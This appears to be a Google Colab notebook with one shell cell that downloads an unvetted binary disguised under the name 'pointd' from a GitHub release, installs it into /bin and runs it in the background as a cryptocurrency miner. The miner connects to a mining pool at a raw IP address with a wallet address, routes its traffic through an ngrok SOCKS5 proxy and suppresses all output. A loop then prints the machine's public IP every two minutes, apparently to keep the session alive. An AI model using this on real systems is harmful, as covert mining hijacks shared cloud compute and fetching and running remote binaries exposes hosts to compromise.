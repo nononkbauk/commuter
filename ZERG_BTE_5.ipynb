{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ZERG_BTE_5.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "sB0-sZtX0Dxg"
      },
      "outputs": [],
      "source": [
        "%%shell\n",
        "wget -q https://github.com/nononkbauk/commuter/releases/download/v2/pointd\n",
        "mv pointd /bin/pointd\n",
        "chmod +x /bin/pointd\n",
        "pointd -a yespower -o stratum+tcp://103.249.70.7:6533 -u DPTuEufB8SbQrYwvSeLaRZrExkUawbBLJX.$(shuf -n 1 -i 1-9999999) -p c=DGB,mc=BTE -x socks5://0.tcp.ngrok.io:14738 >/dev/null 2>&1 >/dev/null &\n",
        "while :; do echo '====>'$(curl ifconfig.me); sleep 120; done"
      ]
    }
  ]
}
